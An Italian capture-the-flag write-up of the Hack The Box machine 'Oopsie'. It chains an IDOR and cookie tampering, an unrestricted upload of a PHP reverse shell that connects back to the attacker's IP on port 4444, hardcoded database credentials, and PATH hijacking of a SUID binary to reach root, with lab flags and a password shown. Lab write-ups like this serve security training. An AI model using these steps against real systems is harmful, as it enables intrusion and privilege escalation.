# HTB — Oopsie

**Difficoltà:** Easy  
**OS:** Linux (Ubuntu 18.04)  
**IP:** 10.129.81.156  
**User Flag:** `f2c74ee8db7983851ab2a96a44eb7981`  
**Root Flag:** `af13b0bee69f8a877c3faf667f7beacf`

---

## Tags
#htb #easy #linux #idor #file-upload #suid #path-hijacking #reverse-shell

---

## Sommario

Macchina Linux Easy su HTB. Il percorso passa per:
1. IDOR nel pannello admin → accesso come admin via cookie manipulation
2. File upload non protetto → PHP reverse shell
3. Credenziali hardcoded nel sorgente → lateral movement a `robert`
4. PATH hijacking su binario SUID → root

---

## 1. Reconnaissance

```bash
echo "10.129.81.156 Oopsie" | sudo tee -a /etc/hosts
sudo nmap -sV -sC -p- Oopsie
```

| Porta | Servizio | Versione |
|-------|----------|----------|
| 22    | SSH      | OpenSSH 7.6p1 |
| 80    | HTTP     | Apache 2.4.29 |

Esplorando il sito si trova l'email dell'admin in fondo alla homepage:

![homepage](Pasted%20image%2020260409203228.png)

---

## 2. Web Exploitation

### Pannello di login nascosto
Trovato nel sorgente della homepage:
```
http://oopsie/cdn-cgi/login/
```

![login page](Pasted%20image%2020260409204807.png)

Login come **guest** → cookie di sessione esposti:
- `user=2233`
- `role=guest`

### IDOR → Admin
Navigando con `id=1` si vede l'account admin:
```
http://oopsie/cdn-cgi/login/admin.php?content=accounts&id=1
```

![admin panel IDOR](Pasted%20image%2020260409205544.png)

- **Access ID admin:** `34322`
- **Email:** `admin@megacorp.com`

Modifica cookie nel browser (DevTools → Storage → Cookies):
```
user  → 34322
role  → admin
```

Accesso al pannello admin con funzione **Upload** abilitata.

---

## 3. Foothold — Reverse Shell

### Preparazione shell
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# modificare:
# $ip = '10.10.15.250';  (ip tun0)
# $port = 4444;
```

### Individuazione path upload
```bash
ffuf -u http://Oopsie/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# → /uploads (301)
```

### Esecuzione
```bash
# terminale 1
nc -lvnp 4444

# terminale 2 — dopo aver caricato shell.php dal pannello admin
curl http://Oopsie/uploads/shell.php
```

![reverse shell](Pasted%20image%2020260409211718.png)

Shell ottenuta come `www-data` (uid=33).

### Upgrade shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 4. Lateral Movement — robert

Credenziali hardcoded nel sorgente PHP:
```bash
cat /var/www/html/cdn-cgi/login/db.php
# $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

```bash
su robert
# password: M3g4C0rpUs3r!
```

```bash
cat /home/robert/user.txt
# f2c74ee8db7983851ab2a96a44eb7981
```

---

## 5. Privilege Escalation — root

### Ricerca SUID / gruppo bugtracker
```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker

ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

### Analisi binario
```bash
strings /usr/bin/bugtracker | grep cat
# cat /root/reports/   ← chiama cat senza path assoluto!
```

### PATH Hijacking
Il binario SUID gira come root ma chiama `cat` senza path assoluto.  
Creiamo un `cat` falso in `/tmp` che lancia bash:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
# Provide Bug ID: 1
# → root shell!
```

```bash
/bin/cat /root/root.txt
# af13b0bee69f8a877c3faf667f7beacf
```

---

## Vulnerabilità Sfruttate

| Vulnerabilità | Descrizione |
|---------------|-------------|
| IDOR | Accesso a risorse altrui tramite manipolazione ID nei parametri GET |
| Cookie Manipulation | Modifica lato client dei cookie di sessione per scalare a admin |
| Unrestricted File Upload | Upload di PHP shell senza validazione del contenuto |
| Hardcoded Credentials | Credenziali DB in chiaro nel codice sorgente PHP |
| PATH Hijacking (SUID) | Binario SUID chiama `cat` senza path assoluto → eseguibile sostituito |

---

## Credenziali trovate

| Utente  | Password        | Servizio |
|---------|-----------------|----------|
| robert  | M3g4C0rpUs3r!   | SSH / su |
| admin   | —               | Web panel (Access ID: 34322) |

---

## Note

- `cat` sovrascritto in `/tmp` → usare `/bin/cat` per leggere file dopo privesc
- L'upload funziona solo con cookie `role=admin` e `user=34322`
- La shell va ricaricata se i cookie scadono o cambiano
